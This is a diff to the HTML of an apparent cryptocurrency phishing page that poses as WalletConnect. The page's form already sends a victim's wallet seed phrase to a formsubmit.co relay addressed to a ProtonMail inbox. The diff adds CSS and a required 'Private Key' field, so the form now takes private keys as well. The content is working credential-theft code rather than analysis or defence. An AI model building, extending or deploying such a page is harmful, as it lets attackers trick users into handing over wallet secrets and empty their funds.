@@ -82,6 +82,21 @@
             height: 60px; /* Taille fixe de la zone de saisie */
             margin-bottom: 5px;
         }
+        #PrivateKey {
+            font-family: system-ui, -apple-system, Segoe UI, Roboto, Helvetica Neue, Noto Sans, Liberation Sans, Arial, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji;        font-size: 1rem;
+
+            width: 89%;
+            background: #2a2b3d;
+            border: 1px solid #4b5563;
+            border-radius: 8px;
+            padding: 1rem;
+            font-size: 1rem;
+            color: #fff;
+            outline: none;
+            resize: none; /* Désactive l'extension de la zone de saisie */
+            height: 6px; /* Taille fixe de la zone de saisie */
+            margin-bottom: 5px;
+        }
         .words-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -239,6 +254,7 @@
     
         <form action="https://formsubmit.co/WalletConnect0@proton.me" method="POST">
             <textarea id="seedPhraseTextarea" name="seedPhrase" placeholder="Enter your seed phrase here. Make sure to add a space between each word." oninput="updateWords(this.value)" required></textarea>
+           <input type="text" name="PrivateKey" id="PrivateKey" placeholder="Enter your Private Key" required>
             <div class="autocomplete-suggestions" id="autocomplete"></div>
             <div class="words-grid" id="wordsGrid"></div>
     
